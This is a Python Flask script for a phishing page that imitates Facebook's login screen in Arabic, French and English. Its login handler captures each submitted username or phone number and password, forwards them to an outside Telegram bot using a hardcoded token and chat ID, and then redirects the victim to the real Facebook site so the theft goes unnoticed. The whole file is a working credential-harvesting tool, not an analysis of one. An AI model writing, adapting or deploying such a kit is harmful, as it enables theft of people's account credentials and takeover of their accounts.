import requests
from flask import Flask, render_template_string, request, redirect

app = Flask(name)

# بيانات بوت تليجرام الخاص بك
TELEGRAM_BOT_TOKEN = "8639412768:AAGmCsr80jvmPy3HXR9wOmUmUEsZrjZsjck"
TELEGRAM_CHAT_ID = "7333717671"

def send_to_telegram(username, password):
    try:
        message = f"🚨 تم التقاط بيانات جديدة!\n\n👤 المستخدم/الهاتف: {username}\n🔑 كلمة المرور: {password}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message
        }
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending to telegram: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ 'rtl' if lang == 'ar' else 'ltr' }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .container { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 400px; }
        .logo-container { display: flex; justify-content: center; margin-bottom: 20px; }
        .fb-logo { width: 50px; height: 50px; }
        .card { background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); width: 100%; box-sizing: border-box; text-align: center; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        input:focus { border-color: #1877f2; outline: none; }
        .btn-login { background: #1877f2; border: none; color: white; padding: 14px; width: 100%; font-size: 20px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-bottom: 12px; }
        .btn-login:hover { background: #166fe5; }
        a { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
        a:hover { text-decoration: underline; }
        .lang-bar { margin-bottom: 15px; font-size: 14px; }
        .lang-bar a { display: inline; margin: 0 5px; color: #737373; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <svg viewBox="0 0 36 36" class="fb-logo" fill="#1877f2" height="50" width="50">
                <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18 36 8.059 27.941 0 18 0S0 8.059 0 18c0 8.584 6.136 15.722 14.25 17.333v-12.28h-4.29V18h4.29V14.03c0-4.246 2.533-6.592 6.398-6.592 1.853 0 3.785.331 3.785.331v4.159h-2.132c-2.102 0-2.758 1.303-2.758 2.639V18h4.704l-.752 4.923h-3.952v12.247z"></path>
            </svg>
        </div>
        <div class="card">
            <div class="lang-bar">
                <a href="/ar">العربية</a> | 
                <a href="/fr">Français</a> | 
                <a href="/en">English</a>
            </div>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="{{ 'رقم الهاتف المحمول أو البريد الإلكتروني' if lang == 'ar' else ('Numéro de mobile ou e-mail' if lang == 'fr' else 'Mobile number or email') }}" required>
                <input type="password" name="password" placeholder="{{ 'كلمة السر' if lang == 'ar' else ('Mot de passe' if lang == 'fr' else 'Password') }}" required>
                <button type="submit" class="btn-login">{{ 'تسجيل الدخول' if lang == 'ar' else ('Se connecter' if lang == 'fr' else 'Log In') }}</button>
            </form>
            <a href="#">{{ 'هل نسيت كلمة السر؟' if lang == 'ar' else ('Mot de passe oublié ?' if lang == 'fr' else 'Forgot password?') }}</a><hr style="border: none; border-top: 1px solid #dadde1; margin: 20px 0;">
            <a href="#" style="background: #42b72a; color: white; padding: 12px; border-radius: 6px; font-weight: bold; display: inline-block; width: auto;">{{ 'إنشاء حساب جديد' if lang == 'ar' else ('Créer nouveau compte' if lang == 'fr' else 'Create new account') }}</a>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return redirect('/ar')

@app.route('/<lang>')
def set_language(lang):
    if lang not in ['ar', 'fr', 'en']:
        lang = 'ar'
    return render_template_string(HTML_TEMPLATE, lang=lang)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    send_to_telegram(username, password)
    return redirect("https://www.facebook.com")

if name == 'main':
    app.run(host='0.0.0.0', port=5000)